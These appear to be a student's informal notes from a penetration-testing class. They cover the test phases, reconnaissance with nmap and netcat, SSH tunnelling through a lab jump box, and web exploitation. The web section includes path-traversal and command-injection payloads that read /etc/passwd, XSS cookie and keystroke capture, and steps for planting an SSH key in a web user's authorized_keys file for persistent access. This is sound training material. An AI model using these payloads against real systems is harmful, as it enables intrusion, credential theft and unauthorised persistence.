Penetration Testing
_______________________________________________________________________________________________________________________

We will always make a tunnel to our jump box first. It is in the grey space. The username and password is student and password is (bad)password. 

Penetration testing is ethical hacking in order to find weaknesses in security.
The rationale promotes critical thinking, so when you are attacking a network you have to think outside of the box in order to get in.

Phase 1
Mission definition is when they set boundaries and rules

Phase 2
Recon, doing either passive or active recon. Using tools like nmap (more active so not necessarily), google dorking, nslookup, social media, etc.

Phase 3
Footprinting, more in depth recon using nmap and nmap script, the more active side, 

Phase 4
Exploitation and Initial Access, gain an initial foothold on network

Phase 5
Post-Exploitation, establish persistence, escalate privileges, cover your tracks, exfilltrate target data

Phase 6
Document Mission, documentation for different audiences

Penetration Test Reporting, an executive summary (breaks down everything as quickly as possible) and technical summary (has a lot more jargon)
When reporting have reasons to report, what to report, screen captures.

Recon
_______________________________________________________________________________________________________________________

nmap scan scripts
OSINT, using google, google dorking, social media, linkden, alternate ports, versions of services running, OS.
DOD states "produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."

Limitations on Collection
Data to Collect, Web Data, Sensitive Data, Publicly Accessible, Social Media, Domain and IP Data

Scraping Data
quotes.toscrape.com
pip install lxml requests
Look at the script on the slides for the scraping data
You will change page and authors that's about it

#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)


Advanced Scanning Techniques
1. Host Discovery
  - Find hosts that are onine
2. Port Enumeration 
  - Find ports for each host that is online
3. Port Interrogation
  - Find what service is running on each open/available port

1. Dirty ping sweep, for i in {1..254}; do (ping -c 1 10.50.$i.$i | grep "bytes from" &); done
2. sudo nmap -sS -Pn 10.50.46.154
2.1. nc -z -v -w 1 10.50.46.154 1-1000 2>/dev/null (maybe?)
3. nc 10.50.46.154 3389
3.1 nikto -h 10.50.46.154 -p 80 (only for web servers)


NMAP Scripting Engine
in /usr/share/nmap/scripts
nmap --script=http-enum.nse 10.50.45.112
nmap --script=banner.nse 10.50.45.112


ALSO ON THE HOST EXPLOITATION FG
Master Sockets
IH> ssh -MS /tmp/gray student@10.50.46.154
JUMP> 

IH> ls /tmp/gray
IH> ssh -MS /tmp/gray -O cancel student@10.50.46 (tears down the tunnel)
IH> ssh -S /tmp/gray dummy -O forward -L2222:10.50.46.238:22
IH> ssh 127.0.0.1 -p 2222

Vulnerability and Exploitation Research

Just google good fuckin nerd





Web Exploitation Day 1
_______________________________________________________________________________________________________________________

THIS SHIT IS IMPORTENANT
GET / HTTP/1.1
We will be using Developer Console but not wireshark or tcpdump


HTTP
A select Few: GET, POST, head, put
HTTP Response Codes
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

inspect and look at network
If 80 is open then immediately make a tunnel and open the web page
.JS is javascript, java is a different language


Enumeration
ROBOTS.TXT 
nmap -T4 -p 80 --script http-enum.nse ipaddr
^ may or may not catch but ROBOTS is crucial 
NEED FOR THE TEST 
Burp suite for outside of class

Reflected XSS 
Needs a pretty secure server that isn't gong to execute this code, and a vulnerable browser
Most common form
Transient, occurs in error messages
Delivered through intermediate media uch as an email link
Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS
Resides on vulnerable site, only requires user to visit page
Capturing cookie
document.cookie
Capturing Keystrokes
bind KEYDOWN and KEYUP
Cap sensitive data
ip document.body.innerHTML

Server side injection view_image.php?file=../../etc/passwd
../../../../../etc/passwd
/var/www/html-userdata
Malicious File upload with the sipcy 
system("ping -c 1 ".$_GET["ip"]);
; cat /etc/passwd


System to ping (X.X.X.X ): 
; mkdir /var/www/ssh
ssh-keygen -t rsa -b 4096
cd .ssh
id_rsa is private key .pub is public
cat public key
grab everything and move it to a vim
; echo "ssh-rsa
student@lin-ops" > /var/www/.ssh/authorized keys
paste in the http, try to cat /var/www/.ssh/authorized_keys to read it
ssh -i id_rsa www-data@10.50.45.112
no password needed cause gaemr
